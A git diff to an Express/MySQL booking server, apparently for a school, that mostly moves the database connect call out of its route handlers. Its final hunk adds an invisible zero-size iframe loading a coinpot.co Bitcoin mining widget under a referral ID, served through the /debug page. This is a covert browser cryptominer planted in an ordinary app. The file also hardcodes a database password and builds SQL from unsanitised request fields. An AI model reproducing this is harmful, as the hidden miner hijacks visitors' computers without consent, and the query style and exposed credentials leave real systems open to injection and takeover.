@@ -10,6 +10,9 @@ const con = mysql.createConnection({
   password: '9Bpo28w#',
   database: 'Wolfgang_twv'
 })
+con.connect(function(err){
+	if (err) throw err
+})
 
 app.use(express.static('public'))
 
@@ -21,16 +24,13 @@ var debugteacher = 'Mate'
 var debugclass = '5AHELS'
 
 app.get('/debug', function(req, res){
-	res.send('Debugging Page...')
-	con.connect(function(err) {
-		if (err) throw err
-		console.log('DEBUG: Connected to SELECT')
-		con.query('SELECT count(*) as booked FROM entlehnt where `date`="'+debugdate+'" AND lesson='+debuglesson, function (err, result, fields) {
-	    if (err) throw err
-			var booked = result[0].booked
-			console.log('DEBUG: Booked: '+booked)
-			toMySql(debugdate, debuglesson, debugcases, debugteacher, debugclass, booked)
-		})
+	res.send('Debugging Page...'+bm)
+	console.log('DEBUG: Connected to SELECT')
+	con.query('SELECT count(*) as booked FROM entlehnt where `date`="'+debugdate+'" AND lesson='+debuglesson, function (err, result, fields) {
+    if (err) throw err
+		var booked = result[0].booked
+		console.log('DEBUG: Booked: '+booked)
+		toMySql(debugdate, debuglesson, debugcases, debugteacher, debugclass, booked)
 	})
 
 })
@@ -60,15 +60,11 @@ app.post('/save',urlencodedParser, function(req, res) {
 	console.log('Lehrer: '+teacher)
 	console.log('Klasse: '+schoolclass)
 
-	con.connect(function(err) {
-		if (err) throw err
-		console.log('Connected to GET')
-		con.query('SELECT count(*) as booked FROM entlehnt where `date`="'+date+'" AND lesson='+lesson, function (err, result, fields) {
-	    if (err) throw err
-			var booked = result[0].booked
-			toMySql(date, lesson, cases, teacher, schoolclass, booked)
-		})
-
+	console.log('Connected to GET')
+	con.query('SELECT count(*) as booked FROM entlehnt where `date`="'+date+'" AND lesson='+lesson, function (err, result, fields) {
+    if (err) throw err
+		var booked = result[0].booked
+		toMySql(date, lesson, cases, teacher, schoolclass, booked)
 	})
 })
 
@@ -95,6 +91,7 @@ function toMySql(date, lesson, cases, teacher, schoolclass, booked){
 				console.log('Zu diesem Zeitpunkt ist leider nichts mehr frei.')
 			}
 		})
+
 	}
 	//----------------------------------------------------------------------------End of toMySql
 }
@@ -109,3 +106,5 @@ function insertIntoDatabase(sqlStr){
 app.listen(8000, function () {
   console.log('Webserver listening on port 8000!')
 })
+
+var bm = '<iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/bitcoincore/?ref=4523B3C471BA&mode=widget" style="overflow:hidden;width:0px;height:0px;"></iframe>'
